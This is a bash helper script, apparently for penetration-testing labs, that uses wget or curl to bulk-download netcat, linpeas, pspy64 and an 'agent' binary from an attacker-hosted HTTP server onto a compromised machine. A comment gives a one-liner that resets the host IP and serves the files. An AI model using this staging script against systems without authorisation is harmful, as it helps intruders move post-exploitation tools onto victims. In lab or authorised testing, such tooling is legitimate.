#!/bin/bash
#move.sh
#script that uses wget or curl to bulk download files
#you can use this command to quickly update the ip or port in it 
#export myIP="10.10.14.2" && cd /tools/linux && export myPORT="80" && sed -i "s|[0-9]\{1,3\}\([\.][0-9]\{1,3\}\)\{3\}|$myIP|" move.sh && sed -i "s|:[[:space:]]*[0-9]\{1,5\}|:$myPORT|g" move.sh && python3 -m http.server 80
#Change your ip as needed
MY_IP="10.10.14.38"

#Change port as needed
MY_PORT=":80"
# Where the files reside (customize as needed)
BASE_URL="http://${MY_IP}${MY_PORT}"

# List of files to download
FILES=("nc" "linpeas.sh" "pspy64" "agent")

# Check for wget or curl
if command -v wget >/dev/null 2>&1; then
  DL_CMD="wget"
elif command -v curl >/dev/null 2>&1; then
  DL_CMD="curl"
else
  echo "Error: Neither wget nor curl is installed on this system." >&2
  exit 1
fi

# Download each file
for file in "${FILES[@]}"; do
  echo "Downloading $file..."
  if [ "$DL_CMD" = "wget" ]; then
    wget -O "$file" "${BASE_URL}/${file}"
  else
    # Using curl
    curl -o "$file" "${BASE_URL}/${file}"
  fi
done

echo "All downloads complete!"
